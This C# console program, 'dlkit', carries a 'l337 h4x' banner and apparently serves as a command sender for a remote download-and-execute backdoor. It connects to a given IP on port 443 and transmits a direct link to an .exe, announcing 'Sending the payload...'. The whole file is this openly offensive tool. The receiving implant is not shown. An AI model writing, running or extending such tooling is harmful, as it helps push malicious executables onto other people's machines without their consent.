using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace dlkit
{
    class Program
    {
        private static string inputPrompt = ">";
        private static string banner = @"
     _ _         _     __      
    | | |       | |   /  |_    
  _ | | |       | |  /_/ | |_  
 / || | |       | | / )| |  _) 
( (_| | |_______| |< ( | | |__ 
 \____|_(_______)_| \_)|_|\___)
        l337 h4x m8 :^) (BUILD 1.0)
";

        static void Main(string[] args)
        {

            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine(banner + "\n");
            Console.ResetColor();

            if (args.Length == 0)
            {
                Console.WriteLine("USAGE: dlkit.exe [ip] [.exe DIRECT link]");
                return;
            }
            else
            {
                string server = args[0];
                string message = args[1];
                try
                {
                    int port = 443;
                    TcpClient client = new TcpClient(server, port);
                    Byte[] data = System.Text.Encoding.ASCII.GetBytes(message);
                    NetworkStream stream = client.GetStream();
                    stream.Write(data, 0, data.Length);
                    Console.WriteLine("Sending the payload...");
                    data = new Byte[256];
                    String responseData = String.Empty;
                    Int32 bytes = stream.Read(data, 0, data.Length);
                    responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
                    Console.WriteLine(responseData);
                    stream.Close();
                    client.Close();
                }
                catch (ArgumentNullException e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("ERROR, press any key");
                    Console.ResetColor();
                }
                catch (SocketException e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("ERROR, press any key");
                    Console.ResetColor();
                }
                Console.ReadKey(true);
            }

        }
    }
}
